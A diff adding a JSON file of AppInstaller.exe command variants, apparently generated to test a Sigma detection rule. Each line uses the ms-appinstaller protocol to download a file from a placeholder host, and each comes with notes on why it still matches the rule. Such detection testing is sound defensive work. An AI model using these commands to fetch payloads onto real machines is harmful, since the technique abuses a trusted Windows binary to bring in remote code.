@@ -1,0 +1,24 @@
+```json
+[
+  {
+    "output": "AppInstaller.exe --uri \"ms-appinstaller://?source=https://example.com/file.appinstaller\"",
+    "explanation": "This command uses the ms-appinstaller protocol handler to download a file via AppInstaller.exe, which matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "AppInstaller.exe -u ms-appinstaller://?source=https://example.com/file.appinstaller",
+    "explanation": "This command uses a short option (-u) instead of --uri, which is equivalent and still matches the Sigma rule."
+  },
+  {
+    "output": "AppInstaller.exe --uri ms-appinstaller://?source=\"https://example.com/file.appinstaller\"",
+    "explanation": "This command omits the outer quotes around the URI, but the protocol and structure remain unchanged, matching the Sigma rule."
+  },
+  {
+    "output": "AppInstaller.exe --uri ms-appinstaller://?source=https://example.com/file.appinstaller ",
+    "explanation": "This command adds an extra space at the end of the command line, which is a safe insertion and still matches the Sigma rule."
+  },
+  {
+    "output": "AppInstaller.exe --uri ms-appinstaller://?source=https://example.com/file.appinstaller",
+    "explanation": "This command is the base command that matches the Sigma rule and is used as a reference for mutation."
+  }
+]
+```
